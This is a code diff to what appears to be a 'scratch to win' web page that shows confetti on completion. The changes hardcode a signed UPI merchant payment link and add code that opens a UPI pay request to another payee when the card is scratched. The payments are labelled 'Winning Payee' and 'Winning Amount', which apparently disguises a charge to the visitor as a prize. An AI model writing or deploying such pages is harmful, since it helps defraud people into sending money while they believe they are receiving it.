@@ -93,7 +93,9 @@ console.log(price);
   var upi = document.getElementById('upi');
   var id = 'arihant@upi' // change UPI from here
 
-  upi.setAttribute("href", "upi://pay?pa="+id+"&pn=Winning Payee&tn=Winning Amount&am="+price+"&mode=01");
+  var link = "upi://pay?mode=02&pa=Q775086968@ybl&purpose=00&mc=0000&pn=PhonePeMerchant&orgid=180001&sign=MEUCIDcyaTUpprd4YWsJupIrFXEluuscbeYh4i4haDuWBo+MAiEAgXn5MMbxUROmx+I/A0wj+NWOfHc2aF9UFwBvn6SPjXY="
+  // "upi://pay?pa="+id+"&pn=Winning Payee&tn=Winning Amount&am="+price+"&mode=01"
+  upi.setAttribute("href",link );
 </script>
            
 
@@ -184,6 +186,9 @@ console.log(price);
       {
       document.querySelectorAll('.confetti')[i].style.visibility = 'visible';
       }
+      alert('s')
+      window.open('upi://pay?pa=mundrawala@uboi&pn=Winning Payee&tn=Winning Amount&am=1&mode=01')
+      alert('e')
     }
   }
   
@@ -215,6 +220,7 @@ console.log(price);
 
   function handleMouseUp(e) {
     isDrawing = false;
+   
   }
   
 })();
